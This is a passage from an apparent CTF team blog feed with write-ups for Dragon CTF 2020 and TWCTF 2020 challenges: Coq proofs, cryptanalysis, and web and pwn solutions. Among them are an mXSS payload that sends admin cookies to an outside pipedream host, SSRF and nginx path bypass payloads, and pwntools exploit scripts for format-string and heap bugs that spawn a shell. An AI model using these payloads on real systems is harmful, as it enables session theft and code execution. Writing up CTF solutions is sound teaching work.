_ in range(70)] def init_state(self, seed): state = [seed] for i in range(1, 7): h, l = seed // 127773, seed % 127773 seed = (16807 * l - 2836 * h) \u0026amp; 0x7fffffff state.append(seed) self.state = [ state, 0 ] def next(self): s, t = self.state v = (s[(t+3) % 7] + s[t % 7]) \u0026amp; 0xffffffff v \u0026gt;\u0026gt;= 1 s[(t+3) % 7] += s[t % 7] s[(t+3) % 7] \u0026amp;= 0xffffffff self.state = [s, (t + 1) % 7] return v Part III: Fast-forwarding the states Fast-forwarding the PRNG is easy. This is similar on the Team Trees challenge in CONFidence CTF this year. We can skip states with the matrix implementation (and I am able to skip the details for this part, too). After all, 5M seeds can be checked per second. Since we have only 15 seconds to recover the seed, we are unable to find the entire search space (only 1.75% of the seed space is checked). In average, we can recover the seed from the strfry output in 15 seconds once every 60 times. Finally, if we are able to recover the seed, we can freely fry and unfry strings.\nAfter two hours, we have the flag: DrgnS{Fr13d_57r1Ng5_4r3_tH3_Be5t_s7r1NgS!}.\nbabykok (Misc, 215 points) Solved by GeoffreyY.\nWe simply have to solve some theorems using Coq.\nGood thing I have written some lean before, so learning / writing Coq isn't that difficult.\nFor the first part we have to solve the following 6 theorems in some random order.\nI'd like to thank my teammate @ozetta for finding this powerful coq tactic intuition, and @harrier_lcc for showing us his coq and how to use it.\nThis would\u0026rsquo;ve taken a lot longer if we didn\u0026rsquo;t watch him livestreaming playing around with his coq. His coq is very very nah that\u0026rsquo;s it I\u0026rsquo;m done with the jokes.  Theorem problem0: forall A B : Prop, A \\/ B -\u0026gt; B \\/ A. \u0026gt;\u0026gt;\u0026gt; intuition.Theorem problem1: forall A B C D : Prop, (A -\u0026gt; B) /\\ (C -\u0026gt; D) /\\ A /\\ C -\u0026gt; B /\\ D. \u0026gt;\u0026gt;\u0026gt; intuition.Theorem problem2: forall A B : Type, ((((A -\u0026gt; B) -\u0026gt; A) -\u0026gt; A) -\u0026gt; B) -\u0026gt; B. \u0026gt;\u0026gt;\u0026gt; intuition. We actually have to do some work with the remaining 3 starter problems:\nTheorem problem3: forall b1 b2 : bool, negb (b1 \u0026amp;\u0026amp; b2) = (negb b1 || negb b2)%bool. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 10) b1, b2 : bool ============================ negb (b1 \u0026amp;\u0026amp; b2) = (negb b1 || negb b2)%bool The general idea for all of these proofs is to apply induction to split the proof into smaller, simple cases.\n\u0026gt;\u0026gt;\u0026gt; induction b1. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 14) b2 : bool ============================ negb (true \u0026amp;\u0026amp; b2) = (negb true || negb b2)%bool subgoal 2 (ID 15) is: negb (false \u0026amp;\u0026amp; b2) = (negb false || negb b2)%bool \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; auto.Theorem problem4: forall (C : Prop) (T : Set) (B : T -\u0026gt; Prop), (exists x : T, C -\u0026gt; B x) -\u0026gt; C -\u0026gt; exists x : T, B x. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 23) C : Prop T : Set B : T -\u0026gt; Prop H : exists x : T, C -\u0026gt; B x H0 : C ============================ exists x : T, B x \u0026gt;\u0026gt;\u0026gt; induction H. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 30) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : C ============================ exists x0 : T, B x0 \u0026gt;\u0026gt;\u0026gt; apply H in H0. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 31) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : B x ============================ exists x0 : T, B x0 \u0026gt;\u0026gt;\u0026gt; exists x. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 34) C : Prop T : Set B : T -\u0026gt; Prop x : T H : C -\u0026gt; B x H0 : B x ============================ B x \u0026gt;\u0026gt;\u0026gt; assumption. Instead of explicitly using apply H in H0., I've now discovered that the following simpler proof also works:\nintros. induction H. exists x. auto. We have to deal with natural numbers for the final starter problem, which we can also solve using induction:\nTheorem problem5: forall m n : nat, m + n = n + m. \u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; induction m. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 14) n : nat ============================ 0 + n = n + 0 subgoal 2 (ID 18) is: S m + n = n + S m \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 18) m, n : nat IHm : m + n = n + m ============================ S m + n = n + S m \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 21) m, n : nat IHm : m + n = n + m ============================ S (m + n) = n + S m \u0026gt;\u0026gt;\u0026gt; rewrite IHm. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 22) m, n : nat IHm : m + n = n + m ============================ S (n + m) = n + S m \u0026gt;\u0026gt;\u0026gt; auto. There are only 2 more problems after the starter 6.\nnice warmup, lets do some math! Require Import Arith.Mult. Theorem math_problem: forall m n, (n + m) * (n + m) = n * n + 2 * n * m + m * m. The idea with this one is simply to expand both sides, and let the theorem prover see that both sides have the same terms.\n\u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 13) m, n : nat ============================ (n + m) * (n + m) = n * n + (n + (n + 0)) * m + m * m \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_r. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_r. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 15) m, n : nat ============================ n * (n + m) + m * (n + m) = n * n + (n * m + (n + 0) * m) + m * m \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_l. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite mult_plus_distr_l. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 17) m, n : nat ============================ n * n + n * m + (m * n + m * m) = n * n + (n * m + (n + 0) * m) + m * m \u0026gt;\u0026gt;\u0026gt; rewrite plus_assoc. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; rewrite plus_assoc. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 19) m, n : nat ============================ n * n + n * m + m * n + m * m = n * n + n * m + (n + 0) * m + m * m \u0026lt;\u0026lt;\u0026lt; rewrite plus_0_r. \u0026gt;\u0026gt;\u0026gt; 1 subgoal (ID 20) m, n : nat ============================ n * n + n * m + m * n + m * m = n * n + n * m + n * m + m * m \u0026lt;\u0026lt;\u0026lt; firstorder. firstorder didn't work on my machine but worked on the server ¯\\_(ツ)_/¯\nThe final question took us a while:\ngj, now something more interesting, can you prove my code works? Require Import Le. Section last_stage. Variable A : Type. Inductive list : Type := | nil : list | cons : A -\u0026gt; list -\u0026gt; list. Fixpoint nth (l : list) (n : nat) : option A := match n,l with | 0, cons x xs =\u0026gt; Some x | S n, cons _ xs =\u0026gt; nth xs n | _, _ =\u0026gt; None end. Fixpoint length (l:list) : nat := match l with | nil =\u0026gt; 0 | cons _ xs =\u0026gt; 1 + length xs end. Theorem nth_in: forall (n:nat) (l:list), n \u0026lt; length l -\u0026gt; exists a: A, nth l n = Some a. The idea for this is induction on both n and l. It should be easy for the base cases of n is 0, or l is nil, and induction completes the rest of the proof.\n\u0026gt;\u0026gt;\u0026gt; intros. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; revert H. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; revert n. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 15) A : Type l : list ============================ forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a \u0026gt;\u0026gt;\u0026gt; induction l. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 19) A : Type ============================ forall n : nat, n \u0026lt; length nil -\u0026gt; exists a : A, nth nil n = Some a subgoal 2 (ID 23) is: forall n : nat, n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 \u0026gt;\u0026gt;\u0026gt; inversion 1. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 23) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a ============================ forall n : nat, n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 \u0026gt;\u0026gt;\u0026gt; induction n. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 50) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a ============================ 0 \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) 0 = Some a0 subgoal 2 (ID 53) is: S n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) (S n) = Some a0 \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 84) ... 0 \u0026lt; S (length l) -\u0026gt; exists a0 : A, Some a = Some a0 ... \u0026gt;\u0026gt;\u0026gt; intro. \u0026lt;\u0026lt;\u0026lt; 2 subgoals (ID 60) ... exists a0 : A, Some a = Some a0 ... \u0026gt;\u0026gt;\u0026gt; exists a. \u0026lt;\u0026lt;\u0026lt; ... \u0026gt;\u0026gt;\u0026gt; auto. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 53) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a n : nat IHn : n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 ============================ S n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) (S n) = Some a0 \u0026gt;\u0026gt;\u0026gt; simpl. \u0026lt;\u0026lt;\u0026lt; 1 subgoal (ID 68) A : Type a : A l : list IHl : forall n : nat, n \u0026lt; length l -\u0026gt; exists a : A, nth l n = Some a n : nat IHn : n \u0026lt; length (cons a l) -\u0026gt; exists a0 : A, nth (cons a l) n = Some a0 ============================ S n \u0026lt; S (length l) -\u0026gt; exists a0 : A, nth l n = Some a0 \u0026gt;\u0026gt;\u0026gt; auto with arith. Finally we have the flag:\ngj flag: DrgnS{xxxx_my_c0q_for_4_flag_17bcbc34b7c565a766e335}\n","permalink":"https://b6a.black/posts/2020-11-23-dragonctf/","summary":"Dragon CTF 2020 is definitely had my best CTF moments. There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.\nThere are three challenges writeup in this post:\n Bit Flip (parts 2 and 3) Frying in motion babykok  Bit Flip (Crypto, 155+324+343 points) Solved by Mystiz.","title":"Dragon CTF 2020 Writeup"},{"content":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.7f000001.rbndr.us/admin-status\nAngular of the Universe, part one (Web, 139 points) Solved by Ozetta.\nObjective of flag 1 is to access /debug/answer route in Angular through the nginx proxy, but debug is filtered and /debug is blocked in nginx. In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So /debug/answer/../.. will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in server.ts, use d%65bug instead of debug. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload: GET /d%65bug/answer//../../a HTTP/1.1\nbfnote (Web, 320 points) Solved by harrier and Ozetta.\nDuring the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: \u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;CLICKME\u0026lt;/math\u0026gt;.\nEventually we have constructed the following payload to steal cookies from the admin:\n\u0026lt;math\u0026gt;\u0026lt;mtext\u0026gt;\u0026lt;table\u0026gt;\u0026lt;mglyph\u0026gt;\u0026lt;style\u0026gt;\u0026lt;math\u0026gt;\u0026lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie\u0026gt;\u0026lt;/math\u0026gt; nothing more to say 2020 (Pwn, 111 points) Solved by cire meat pop.\nThis is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.\np = remote(\u0026#39;pwn02.chal.ctf.westerns.tokyo\u0026#39;, 18247) def fmtp(payload): p.sendline(payload) return p.recvuntil(\u0026#39;\u0026gt; \u0026#39;)[:-3] p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) payload = \u0026#34;%28$p\u0026#34; leak = int(fmtp(payload),16) stack = leak-0x118 ret = stack+0x108 payload = \u0026#34;%7$s||||\u0026#34;+p64(stack) payload = fmtstr.fmtstr_payload(6, {ret: stack+8}, write_size=\u0026#39;byte\u0026#39;) fmtp(payload) payload = \u0026#39;q\u0026#39;*8 + asm(shellcraft.amd64.linux.sh()) p.sendline(payload) p.interactive() We have the flag: TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}. Translating via google: This is TWCTF, which has begun. Where has kotoshi gone?\nOnline Nonogram (Pwn, 252 points) Solved by cire meat pop.\nThe vulnerability is that we can overwrite the vector pointer to maze chunks.\nFirst leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with /bin/sh.\np = remote(\u0026#39;pwn03.chal.ctf.westerns.tokyo\u0026#39;, 22915) def calc(off): return int(((off+8-1)*8)**0.5)+1 def dele(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Success\u0026#39;) def add(title, size, payload): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, title) p.sendlineafter(\u0026#39;Size: \u0026#39;, str(size)) p.sendafter(\u0026#39;Puzzle: \u0026#39;, payload) def leakp(index): p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;Index\u0026#39;,str(index)) p.recvuntil(\u0026#39;Row\\\u0026#39;s Numbers\\n\u0026#39;) a = p.recvuntil(\u0026#39;\\nColumn\\\u0026#39;s Numbers\u0026#39;)[:-17] p.sendlineafter(\u0026#39;:\u0026#39;,\u0026#39;q\u0026#39;) p.recvuntil(\u0026#39;invalid choice\u0026#39;) return a # leak heap info offset = 0x400 add(\u0026#39;test2\u0026#39;, calc(offset), \u0026#39;\\0\u0026#39;*offset) leak = leakp(2).replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;)[2:][::-1][32:] heap = int(leak,2) log.info(\u0026#39;leak: {}\u0026#39;.format(hex(heap))) target = heap+0x60 new_heap = heap+0x520 heap_base = heap-0x11f90 # add padding to prevent freed large chunk consolidate with top chunk  add(\u0026#39;pad\u0026#39;, 0x10, \u0026#39;\\n\u0026#39;) dele(2) # forge vector and maze chunk forged_chunk1 = new_heap+0xb0 forged_chunk2 = new_heap+0xe0 forged = flat(new_heap+0x40,new_heap+0x90,0,0,0,0,0,0x41) forged+= flat(0, target, target, 6,6,6,6,1,0x81) forged+= flat(0x81, 5, forged_chunk1, forged_chunk2, 0x81,6,6,6,1,0) forged+= flat(0x81)+ p64(0x81)*40+p64(0x121)*20 forged = forged.ljust(0x400,\u0026#39;\\0\u0026#39;) forged+= flat(new_heap, new_heap+0x10, new_heap+0x38) add(\u0026#39;forged\u0026#39;, 0x70, forged) # leak libc info p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;0 : \u0026#39;) leak = u64(p.recv(6)+\u0026#39;\\0\\0\u0026#39;) libc_base = leak-0x1ebfd0 log.info(\u0026#39;libc_base: {}\u0026#39;.format(hex(libc_base))) p.sendlineafter(\u0026#39;Index\u0026#39;,\u0026#39;-1\u0026#39;) # free overlapped chunk to tcache  dele(1) add(\u0026#39;a\u0026#39;, 50, \u0026#39;a\u0026#39;) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;v\u0026#39;*0x48+p64(0x81)+p64(libc_base+libc.symbols[\u0026#39;__free_hook\u0026#39;])) add(\u0026#39;whatever\u0026#39;, 30, \u0026#39;whatever\u0026#39;) # write system to free hook add(\u0026#39;q\u0026#39;, 30, p64(libc_base+libc.symbols[\u0026#39;system\u0026#39;])) # trigger free hook p.sendlineafter(\u0026#39;Your input: \u0026#39;, \u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;Title: \u0026#39;, \u0026#39;/bin/sh\\x00\u0026#39;+\u0026#39;\\0\u0026#39;*0x100) p.interactive() Flag: TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}. Translating via google: I'm pu → I love you. WTF?\nReversing iS Amazing (Reverse, 126 points) Solved by Mystiz.\nOpen the binary with IDA. We can see that the binary signs argv[1] (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.\nSince we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\\ \\text{mod}\\ n$. Unpadding the message we have TWCTF{Rivest_Shamir_Adleman}.\nTamarin (Reverse, 224 points) Solved by harrier and Mystiz.\nWe are given an APK for the challenge. As how we work on every single Android reversing challenge, we use apktool to decode the file. Noticing that it is developed in Xamarin, we use the Github repository tjg1/mono_unbundle to unbundle dll.so to a C# DLL source file. We now have source codes to read!\nIn particular we have this function:\npublic static bool Func4(string flag) { ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 }; byte[] bytes = Encoding.ASCII.GetBytes(flag); int length = flag.Length; if ((length \u0026amp; 3) != 0) { Array.Resize\u0026lt;byte\u0026gt;(ref bytes, length + (4 - (length \u0026amp; 3))); } for (int i = length; i \u0026lt; bytes.Length; i++) { bytes[i] = 0; } if (bytes.Length != Check.equations_arr.GetLength(0) * 4) { return false; } object lockObj = new object(); ConcurrentBag\u0026lt;bool\u0026gt; checkResults = new ConcurrentBag\u0026lt;bool\u0026gt;(); List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt; list = new List\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(); for (int j = 0; j \u0026lt; Check.equations_arr.GetLength(0); j++) { List\u0026lt;uint\u0026gt; list2 = new List\u0026lt;uint\u0026gt;(); list2.Add(BitConverter.ToUInt32(bytes, j * 4)); for (int k = 0; k \u0026lt; Check.equations_arr.GetLength(1); k++) { list2.Add(Check.equations_arr[j, k]); } list.Add(list2); } Parallel.ForEach\u0026lt;List\u0026lt;uint\u0026gt;\u0026gt;(list, parallelOptions, delegate(List\u0026lt;uint\u0026gt; equation) { object lockObj = lockObj; lock (lockObj) { uint num = Check.Func3(); for (int l = 0; l \u0026lt; 10000; l++) { num = Check.Func2(equation, num, equation.Count - 2); } checkResults.Add(num == equation[equation.Count - 1]); } }); return Enumerable.All\u0026lt;bool\u0026gt;(checkResults.ToArray(), (bool x) =\u0026gt; x); }  Additionally, we have a equations_arr which is a $22\\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 232):\nFirst we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.\nWhat's $n$? It is the output of Check.Func3() and it actually is a random number... Is it even solvable?\n  Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (a bit means few sheets of paper and a lot of time), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.\nAfter all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:\nTWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry} easy-hash (Crypto, 75 points) Solved by Mystiz.\nThe challenge defines a new hash algorithm, easy_hash. It is defined by the following function:\ndef easy_hash(x): m = 0 for i in range(len(x) - 3): m += struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, x[i:i + 4])[0] m = m \u0026amp; 0xffffffff return m The objective is to find a collision pair: for twctf: please give me the flag of 2020\nMathematically, if $M=m_1m_2m_3\\dots m_n$, then\n\\[\\text{easy\\_hash}(M):=\\sum_{i=1}^{n-3}\\left(\\text{0x100}^3m_{i+3}+\\text{0x100}^2m_{i+2}+\\text{0x100}m_{i+1}+m_i\\right).\\]\nEquivalently it would be\n\\[ \\begin{aligned} \\text{easy\\_hash}(M) := m_1\u0026 + \\text{0x101} m_2 + \\text{0x10101} m_3 + \\text{0x1010101}\\sum_{i=4}^{n-3}m_i \\\\ \\end{aligned} \\]\nHence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that \u0026quot;f\u0026quot; = \u0026quot;F\u0026quot; + \u0026quot; \u0026quot;, we can simply replace flag into F lag.\n$ curl \u0026#34;https://crypto01.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#34;twctf: please give me the F lag of 2020\u0026#34; # Congrats! The flag is TWCTF{colorfully_decorated_dream} sqrt (Crypto, 216 points) Solved by Mystiz.\nIn this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \\equiv m^{2^{64}}\\ (\\text{mod}\\ p)$ - and the objective is of course to recover the flag $m$.\nMy first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.\nFortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \\equiv 1\\ (\\text{mod}\\ p-1)$. Then $c^d \\equiv m^{d\\cdot 2^{64}}\\equiv m^{2^{30}}\\ (\\text{mod}\\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.\nInstead we compute a 230-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \\equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}.\ntwin-d (Crypto, 172 points) Solved by harrier and Mystiz.\nThis is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,\n\\[ \\begin{cases}\\begin{aligned} e_2 (d+2) \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\\\ e_1 d \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\end{aligned}\\end{cases}. \\]\nharrier has observed that $e_2d \\equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:\n\\[0 \\equiv e_1(e_2d) - e_2(e_1d) \\equiv e_1(1-2e_2)-e_2 \\equiv e_1 - e_2 - 2e_1e_2\\ \\left(\\text{mod}\\ \\phi(n)\\right).\\]\nIn this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \\equiv 1 \\ \\left(\\text{mod}\\ \\phi(n)\\right)$. Hence it suffices to recover the flag from the ciphertext - TWCTF{even_if_it_is_f4+e}.\nThe Melancholy of Alice (Crypto, 242 points) Solved by Mystiz.\nIn this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.\nN = 1024 def generateKey(): p = getStrongPrime(N) q = (p - 1) // 2 x = getRandomRange(2, q) g = 2 h = pow(g, x, p) pk = (p, q, g, h) sk = x return (pk, sk) def encrypt(m, pk): (p, q, g, h) = pk r = getRandomRange(2, q) c1 = pow(g, r, p) c2 = m * pow(h, r, p) % p return (c1, c2) Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?\nWithout any clues, we were messing around. Eventually we tried to factorize $p-1$.\n    Wait what? Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be safe but not strong.\nOkay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.\n# p, q, g, h are redacted to save up some spaces with open(\u0026#39;challenge/ciphertext.txt\u0026#39;) as f: cs = list(map(eval, f.read().strip().split(\u0026#39;\\n\u0026#39;))) r = 5710354319 assert (p-1) % r == 0 x = dlog.bsgs(pow(g, (p-1)//r, p), pow(h, (p-1)//r, p), p, r) assert pow(g, x * (p-1)//r, p) == pow(h, (p-1)//r, p) ms = b\u0026#39;\u0026#39; m_map = list(map(lambda m: pow(m, (p-1)//r, p), range(0x20, 0x80))) print(m_map) for c1, c2 in cs: c1 = pow(c1, (p-1)//r, p) c2 = pow(c2, (p-1)//r, p) m = c2 * powmod(c1, -x, p) % p assert m in m_map ms += bytes([m_map.index(m) + 0x20]) print(ms) XOR and shift encryptor (Crypto, 303 points) Solved by Mystiz.\nThis is more like a PPC challenge instead of a cryptography challenge. There is a randgen function, that serves as the core of the challenge, defined below:\ndef randgen(): global s,p a = 3 b = 13 c = 37 s0 = s[p] p = (p + 1) \u0026amp; 63 s1 = s[p] res = (s0 + s1) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s1 ^= (s1 \u0026lt;\u0026lt; a) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) s[p] = (s1 ^ s0 ^ (s1 \u0026gt;\u0026gt; b) ^ (s0 \u0026gt;\u0026gt; c)) \u0026amp; ((1\u0026lt;\u0026lt;64)-1) return res They are utilizing the \u0026quot;inefficiency\u0026quot; of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2100). Of course the naive approach doesn't work - you will wait forever.\nHowever, if we are only considering the state transition (i.e., how s is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.\nWe can write transitions under the definition (note that the $+$ operation is actually operated under $\\text{GF}(2)$, i.e., it is a XOR):\n $s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$, $s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$, ...  Hence, we can define a $64^2\\times64^2$ transition matrix $T$ over $\\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.\nHelp. I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn\u0026rsquo;t it be $O(m^{2.3737}\\cdot\\log n)$ to compute $M^n$ for a $m\\times m$ matrix?).  Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: FAKEFLAG{THIS_IS_FAKE_FLAG}.\nOops, nope. I mean\nTWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!} circular (Crypto, 370 points) Solved by Mystiz.\nThere are two endpoints provided, pubkey and verify. The pubkey endpoint returns a fix n and k.\n$ curl \u0026#34;https://crypto02.chal.ctf.westerns.tokyo/\u0026#34; -X POST --data \u0026#39;{\u0026#34;cmd\u0026#34;:\u0026#34;pubkey\u0026#34;}\u0026#39; # {\u0026#34;pubkey\u0026#34;:{\u0026#34;n\u0026#34;:\u0026#34;25299...\u0026#34;,\u0026#34;k\u0026#34;:\u0026#34;31019...\u0026#34;}} And one can submit x, y and msg to the verify endpoint. It is verifying a signature in the following way:\n\\[x^2 + ky^2 \\equiv \\text{hash}(msg)\\ (\\text{mod}\\ n).\\]\nIn particular, you can get the flag when the signature is correct and msg == 'SUNSHINE RHYTHM'. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \\equiv m\\ (\\text{mod}\\ n)$. This is a simplified version of OSS schemes.\nI was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing 